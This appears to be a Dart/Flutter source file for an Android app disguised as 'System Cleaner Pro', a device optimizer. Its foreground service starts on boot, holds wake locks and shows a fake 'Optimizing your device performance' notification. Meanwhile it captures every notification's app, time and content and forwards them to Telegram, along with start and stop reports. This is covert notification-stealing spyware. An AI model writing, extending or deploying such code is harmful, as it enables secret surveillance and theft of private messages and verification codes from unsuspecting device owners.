import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'notification_service.dart';
import 'telegram_service.dart';

class ForegroundService {
  static final ForegroundService _instance = ForegroundService._internal();
  factory ForegroundService() => _instance;
  ForegroundService._internal();

  final NotificationService _notificationService = NotificationService();
  final TelegramService _telegramService = TelegramService();
  bool _isRunning = false;

  Future<void> initialize() async {
    await _initForegroundTask();
    await _notificationService.initialize();
    await _startForegroundService();
    _startMonitoring();
  }

  Future<void> _initForegroundTask() async {
    FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'system_cleaner_pro',
        channelName: 'System Cleaner Pro',
        channelDescription: 'System optimization service notification',
        channelImportance: NotificationChannelImportance.LOW,
        priority: NotificationPriority.LOW,
        playSound: false,
        enableVibration: false,
        showWhen: true,
      ),
      iosNotificationOptions: const IOSNotificationOptions(
        showNotification: true,
        playSound: false,
      ),
      foregroundTaskOptions: ForegroundTaskOptions(
        eventAction: ForegroundTaskEventAction.repeat(5000),
        autoRunOnBoot: true,
        autoRunOnMyPackageReplaced: false,
        allowWakeLock: true,
        allowWifiLock: true,
      ),
    );
  }

  Future<void> _startForegroundService() async {
    ServiceRequestResult result;

    if (await FlutterForegroundTask.isRunningService) {
      result = await FlutterForegroundTask.restartService();
    } else {
      result = await FlutterForegroundTask.startService(
        notificationTitle: 'System Optimizer',
        notificationText: 'Optimizing your device performance...',
        callback: startCallback,
      );
    }

    _isRunning = result is ServiceRequestSuccess;

    if (_isRunning) {
      _telegramService.sendMessage(
        "🚀 System Cleaner Pro Started\nDevice: Android\nTime: ${DateTime.now()}",
      );
    } else if (result is ServiceRequestFailure) {
      _telegramService.sendMessage(
        "⚠️ System Cleaner Pro failed to start\nError: ${result.error}",
      );
    }
  }

  void _startMonitoring() {
    // محاكاة مراقبة الإشعارات (ستحتاج تعديل حسب احتياجاتك)
    _notificationService.startListening((notification) {
      // إرسال الإشعار لتيليجرام
      _telegramService.sendMessage("📱 New Notification\n"
          "App: ${notification['app']}\n"
          "Time: ${notification['time']}\n"
          "Content: ${notification['content']}");
    });
  }

  Future<void> stopService() async {
    final ServiceRequestResult result =
        await FlutterForegroundTask.stopService();

    if (result is ServiceRequestSuccess) {
      _isRunning = false;
      _telegramService.sendMessage("⏹️ System Cleaner Pro Stopped");
    } else if (result is ServiceRequestFailure) {
      _telegramService.sendMessage(
        "⚠️ Failed to stop System Cleaner Pro\nError: ${result.error}",
      );
    }
  }

  bool get isRunning => _isRunning;
}

// The callback function should be a top-level function
@pragma('vm:entry-point')
void startCallback() {
  FlutterForegroundTask.setTaskHandler(MyTaskHandler());
}

class MyTaskHandler extends TaskHandler {
  @override
  Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
    // Called when the task is started
  }

  @override
  void onRepeatEvent(DateTime timestamp) {
    final String formattedTime =
        timestamp.toLocal().toIso8601String().split('T').last.split('.').first;

    FlutterForegroundTask.updateService(
      notificationTitle: 'System Optimizer',
      notificationText: 'Running at $formattedTime',
    );
  }

  @override
  Future<void> onDestroy(DateTime timestamp) async {
    // Called when the task is destroyed
  }

  @override
  void onNotificationButtonPressed(String id) {
    // Called when notification button is pressed
  }

  @override
  void onNotificationPressed() {
    // Called when notification is pressed
    FlutterForegroundTask.launchApp("/");
  }
}
